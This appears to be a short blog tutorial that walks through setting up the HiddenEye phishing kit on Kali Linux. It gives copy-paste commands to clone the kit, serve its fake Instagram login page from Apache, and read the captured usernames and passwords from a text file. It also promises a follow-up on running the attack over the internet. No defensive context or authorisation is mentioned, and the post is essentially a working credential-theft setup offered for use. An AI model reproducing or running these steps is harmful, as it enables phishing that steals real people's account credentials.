---
title: 'Social Engineering Tutorial ⚡'
date: '2023-06-07'
category: 'Guide'
tags: 'tutorial'
image_url: 'https://integrisit.com/wp-content/uploads/2022/12/social_engineering-01.png'
---

Social Engineering: Step-by-Step Guide
======================================

* * * * *

Step 1: Fire up Kali and install dependencies
---------------------------------------------

##### Copy and paste these commands in your terminal.

1.  `sudo apt update -y`
2.  `sudo apt install apache2 php git -y`
3.  `cd ~/Documents && git clone https://github.com/Morsmalleo/HiddenEye.git`
4.  `cd HiddenEye/WebPages/Instagram_web && touch usernames.txt`
5.  `sudo cp -r * /var/www/html`
6.  `sudo systemctl enable apache2 && sudo systemctl start apache2`

* * * * *

#### Step 2: Testing on localhost

Now head on to [localhost.](http://localhost/) Now login with a random username and password. Go to your terminal and type the following command to view the captured credentials: `sudo cat /var/www/html/usernames.txt`

* * * * *

##### Upcoming: Running the attack over the internet.

> Amateurs hack systems, professionals hack people 💀